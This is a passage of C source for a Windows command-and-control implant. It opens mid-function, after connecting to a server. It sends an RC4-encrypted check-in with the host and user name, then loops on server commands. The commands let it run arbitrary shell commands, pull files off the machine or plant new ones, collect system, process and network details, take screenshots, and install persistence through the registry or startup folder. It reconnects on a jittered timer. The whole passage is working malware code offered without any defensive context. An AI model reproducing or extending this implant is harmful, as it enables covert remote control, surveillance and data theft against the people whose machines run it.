                "{\"type\":\"checkin\",\"host\":\"%s\",\"user\":\"%s\",\"pid\":%d}",
                getenv("COMPUTERNAME"), 
                getenv("USERNAME"),
                GetCurrentProcessId());
        
        char* encrypted_checkin = rc4_encrypt(checkin);
        printf("[DEBUG] Sending checkin: %s\n", checkin);
        
        send(sock, encrypted_checkin, strlen(encrypted_checkin), 0);
        free(encrypted_checkin);
        printf("[+] Checkin sent\n");
        
        // MAIN LOOP: Wait for commands from server
        int connected = 1;
        time_t last_checkin = time(NULL);
        int processing_command = 0;
        
        while (connected) {
            // Set timeout for receiving
            struct timeval tv;
            tv.tv_sec = 2;  // 2 second timeout
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
            
            char buffer[4096];
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received > 0) {
                buffer[bytes_received] = '\0';
                printf("[DEBUG] Received (%d bytes)\n", bytes_received);
                
                // Decrypt
                char* decrypted = rc4_decrypt(buffer);
                printf("[+] Decrypted: %s\n", decrypted);
                
                // Check message type from JSON
                char* type_ptr = strstr(decrypted, "\"type\"");
                char* cmd_ptr = strstr(decrypted, "\"command\"");
                
                if (type_ptr && strstr(type_ptr, "\"file_transfer\"")) {
                    processing_command = 1;
                    
                    // Parse JSON fields for file transfer
                    char* action_ptr = extract_json_value(decrypted, "\"action\"");
                    char* remote_path_ptr = extract_json_value(decrypted, "\"remote_path\"");
                    char* local_path_ptr = extract_json_value(decrypted, "\"local_path\"");
                    char* data_ptr = extract_json_value(decrypted, "\"data\"");
                    
                    if (action_ptr && remote_path_ptr) {
                        printf("[+] File transfer: %s -> %s\n", action_ptr, remote_path_ptr);
                        
                        if (strcmp(action_ptr, "download") == 0 && data_ptr) {
                            // Server is sending us a file
                            int written = write_file(remote_path_ptr, data_ptr, strlen(data_ptr));
                            
                            char response[512];
                            if (written > 0) {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"success\",\"message\":\"File downloaded: %d bytes\"}",
                                        written);
                            } else {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"error\",\"message\":\"Download failed\"}");
                            }
                            
                            char* encrypted = rc4_encrypt(response);
                            send(sock, encrypted, strlen(encrypted), 0);
                            free(encrypted);
                        }
                        else if (strcmp(action_ptr, "upload") == 0) {
                            // Server wants a file from us
                            int file_size = 0;
                            char* b64_data = read_file_base64(remote_path_ptr, &file_size);
                            
                            if (b64_data && file_size > 0) {
                                char* response = malloc(file_size + 256);
                                snprintf(response, file_size + 256,
                                        "{\"type\":\"file_response\",\"filename\":\"%s\",\"data\":\"%s\"}",
                                        remote_path_ptr, b64_data);
                                
                                char* encrypted = rc4_encrypt(response);
                                send(sock, encrypted, strlen(encrypted), 0);
                                free(encrypted);
                                free(response);
                                free(b64_data);
                            } else {
                                char error_response[256];
                                snprintf(error_response, sizeof(error_response),
                                        "{\"type\":\"response\",\"status\":\"error\",\"message\":\"Failed to read file\"}");
                                
                                char* encrypted = rc4_encrypt(error_response);
                                send(sock, encrypted, strlen(encrypted), 0);
                                free(encrypted);
                            }
                        }
                        
                        // Free extracted values
                        if (action_ptr) free(action_ptr);
                        if (remote_path_ptr) free(remote_path_ptr);
                        if (local_path_ptr) free(local_path_ptr);
                        if (data_ptr) free(data_ptr);
                    }
                    
                    processing_command = 0;
                    last_checkin = time(NULL);
                }
                else if (type_ptr && cmd_ptr && strstr(type_ptr, "command")) {
                    processing_command = 1;
                    
                    // Find the command value
                    char* value_start = strchr(cmd_ptr, ':');
                    if (value_start) {
                        value_start++; // Move past ':'
                        
                        // Skip whitespace
                        while (*value_start == ' ') value_start++;
                        
                        // Remove quotes if present
                        if (*value_start == '"') {
                            value_start++;
                            char* value_end = strchr(value_start, '"');
                            if (value_end) {
                                *value_end = '\0';
                            }
                        } else {
                            // Value might not have quotes, find next comma or brace
                            char* value_end = value_start;
                            while (*value_end && *value_end != ',' && *value_end != '}' && *value_end != ' ') {
                                value_end++;
                            }
                            *value_end = '\0';
                        }
                        
                        printf("[+] Command received: %s\n", value_start);
                        
                        // Check for special commands first
                        if (strncmp(value_start, "!sysinfo", 8) == 0) {
                            printf("[+] Gathering system information...\n");
                            
                            // Get all system info
                            char* system_info = get_system_info();
                            char* process_list = get_process_list();
                            char* network_info = get_network_info();
                            
                            // Combine all info
                            char combined_info[16384];  // 16KB buffer
                            snprintf(combined_info, sizeof(combined_info),
                                    "%s\n%s\n%s",
                                    system_info, process_list, network_info);
                            
                            printf("[DEBUG] Total info size: %zu bytes\n", strlen(combined_info));
                            
                            // Escape for JSON
                            char* escaped_result = (char*)malloc(strlen(combined_info) * 2 + 1);
                            if (!escaped_result) {
                                printf("[-] Failed to allocate memory for escaping\n");
                                
                                // Send error response
                                char error_response[256];
                                snprintf(error_response, sizeof(error_response),
                                        "{\"type\":\"response\",\"status\":\"error\",\"output\":\"Memory allocation failed\"}");
                                char* encrypted_error = rc4_encrypt(error_response);
                                send(sock, encrypted_error, strlen(encrypted_error), 0);
                                free(encrypted_error);
                            } else {
                                int j = 0;
                                for (int i = 0; combined_info[i] != '\0'; i++) {
                                    if (combined_info[i] == '"') {
                                        escaped_result[j++] = '\\';
                                        escaped_result[j++] = '"';
                                    } else if (combined_info[i] == '\\') {
                                        escaped_result[j++] = '\\';
                                        escaped_result[j++] = '\\';
                                    } else if (combined_info[i] == '\n') {
                                        escaped_result[j++] = '\\';
                                        escaped_result[j++] = 'n';
                                    } else if (combined_info[i] == '\r') {
                                        escaped_result[j++] = '\\';
                                        escaped_result[j++] = 'r';
                                    } else {
                                        escaped_result[j++] = combined_info[i];
                                    }
                                }
                                escaped_result[j] = '\0';
                                
                                // Create response
                                char* response = (char*)malloc(strlen(escaped_result) + 100);
                                if (response) {
                                    snprintf(response, strlen(escaped_result) + 100,
                                            "{\"type\":\"response\",\"status\":\"success\",\"output\":\"%s\"}",
                                            escaped_result);
                                    
                                    printf("[DEBUG] Final response size: %zu bytes\n", strlen(response));
                                    
                                    // Encrypt and send
                                    char* encrypted_response = rc4_encrypt(response);
                                    if (encrypted_response) {
                                        int sent = send(sock, encrypted_response, strlen(encrypted_response), 0);
                                        printf("[+] System info sent: %d bytes\n", sent);
                                        free(encrypted_response);
                                    }
                                    
                                    free(response);
                                }
                                free(escaped_result);
                            }
                            
                            processing_command = 0;
                            last_checkin = time(NULL);
                        }
                        
    else if (strncmp(value_start, "!screenshot", 11) == 0) {
    printf("[+] Capturing screenshot...\n");
    
    // 1. Get BMP data directly (not base64)
    int bmp_size = 0;
    char* bmp_data = capture_screen(&bmp_size);
    
    if (bmp_data && bmp_size > 0) {
        // 2. Convert to hex (JSON-safe)
        char* hex_data = (char*)malloc(bmp_size * 2 + 1);
        for (int i = 0; i < bmp_size; i++) {
            sprintf(hex_data + (i * 2), "%02x", (unsigned char)bmp_data[i]);
        }
        hex_data[bmp_size * 2] = '\0';
        
        // 3. Create JSON response with hex data
        int hex_len = bmp_size * 2;
        char* response = malloc(hex_len + 256);
        snprintf(response, hex_len + 256,
                "{\"type\":\"screenshot\",\"data\":\"%s\",\"size\":%d}",
                hex_data, bmp_size);
        
        // 4. Send
        char* encrypted = rc4_encrypt(response);
        send(sock, encrypted, strlen(encrypted), 0);
        
        // 5. Cleanup
        free(encrypted);
        free(response);
        free(hex_data);
        free(bmp_data);
        
        printf("[+] Screenshot sent (%d bytes BMP -> %d bytes hex)\n", bmp_size, hex_len);
    } else {
        char error_response[256];
        snprintf(error_response, sizeof(error_response),
                "{\"type\":\"response\",\"status\":\"error\",\"message\":\"Failed to capture screenshot\"}");
        
        char* encrypted = rc4_encrypt(error_response);
        send(sock, encrypted, strlen(encrypted), 0);
        free(encrypted);
    }
    
    processing_command = 0;
    last_checkin = time(NULL);
}
                        else if (strncmp(value_start, "!persist", 8) == 0) {
                            printf("[+] Establishing persistence...\n");
                            
                            // Get current executable path
                            char beacon_path[MAX_PATH];
                            GetModuleFileNameA(NULL, beacon_path, MAX_PATH);
                            
                            char response[512];
                            
                            // Try registry persistence first
                            if (add_registry_persistence(beacon_path)) {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"success\",\"message\":\"Registry persistence added\"}");
                            }
                            // Try startup folder as backup
                            else if (add_startup_folder_persistence(beacon_path)) {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"success\",\"message\":\"Startup folder persistence added\"}");
                            }
                            else {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"error\",\"message\":\"Failed to establish persistence\"}");
                            }
                            
                            char* encrypted = rc4_encrypt(response);
                            send(sock, encrypted, strlen(encrypted), 0);
                            free(encrypted);
                            
                            processing_command = 0;
                            last_checkin = time(NULL);
                        }
                        else {
                            // Regular command execution
                            char* result = execute_system_command(value_start);
                            
                            // Create response
                            char response[8192];
                            // Escape quotes in result for JSON
                            char escaped_result[4096];
                            int j = 0;
                            for (int i = 0; result[i] != '\0' && j < sizeof(escaped_result) - 2; i++) {
                                if (result[i] == '"') {
                                    escaped_result[j++] = '\\';
                                    escaped_result[j++] = '"';
                                } else if (result[i] == '\\') {
                                    escaped_result[j++] = '\\';
                                    escaped_result[j++] = '\\';
                                } else if (result[i] == '\n') {
                                    escaped_result[j++] = '\\';
                                    escaped_result[j++] = 'n';
                                } else if (result[i] == '\r') {
                                    escaped_result[j++] = '\\';
                                    escaped_result[j++] = 'r';
                                } else {
                                    escaped_result[j++] = result[i];
                                }
                            }
                            escaped_result[j] = '\0';
                            
                            // Extract command ID if present
                            int cmd_id = -1;
                            char* id_ptr = strstr(decrypted, "\"cmd_id\"");
                            if (id_ptr) {
                                char* id_start = strchr(id_ptr, ':');
                                if (id_start) {
                                    sscanf(id_start + 1, "%d", &cmd_id);
                                }
                            }
                            
                            if (cmd_id != -1) {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"cmd_id\":%d,\"status\":\"success\",\"output\":\"%s\"}",
                                        cmd_id, escaped_result);
                            } else {
                                snprintf(response, sizeof(response),
                                        "{\"type\":\"response\",\"status\":\"success\",\"output\":\"%s\"}",
                                        escaped_result);
                            }
                            
                            printf("[DEBUG] Sending response: %s\n", response);
                            
                            // Encrypt and send
                            char* encrypted_response = rc4_encrypt(response);
                            send(sock, encrypted_response, strlen(encrypted_response), 0);
                            free(encrypted_response);
                            printf("[+] Response sent\n");
                            
                            processing_command = 0;
                            last_checkin = time(NULL);  // Reset checkin timer
                        }
                    }
                } else {
                    printf("[+] Not a command or file transfer, continuing...\n");
                }
            } 
            else if (bytes_received == 0) {
                printf("[+] Server closed connection\n");
                connected = 0;
            }
            else {
                // Timeout occurred - no data received
                // Only send checkin if not processing a command
                if (!processing_command) {
                    time_t now = time(NULL);
                    if (difftime(now, last_checkin) >= 30) {
                        printf("[+] Sending periodic checkin\n");
                        
                        char heartbeat[128];
                        snprintf(heartbeat, sizeof(heartbeat),
                                "{\"type\":\"checkin\",\"timestamp\":%ld}",
                                now);
                        
                        char* encrypted_heartbeat = rc4_encrypt(heartbeat);
                        send(sock, encrypted_heartbeat, strlen(encrypted_heartbeat), 0);
                        free(encrypted_heartbeat);
                        
                        last_checkin = now;
                    }
                }
                
                // Check connection
                int error = 0;
                socklen_t len = sizeof(error);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&error, &len);
                if (error != 0) {
                    printf("[-] Socket error: %d\n", error);
                    connected = 0;
                }
            }
        }
        
        closesocket(sock);
        printf("[-] Disconnected\n");
        
        // Sleep before reconnecting
        int sleep_time = BEACON_INTERVAL + (rand() % JITTER_RANGE);
        printf("[+] Reconnecting in %d ms\n", sleep_time);
        Sleep(sleep_time);
    }
    
    WSACleanup();
    return 0;
}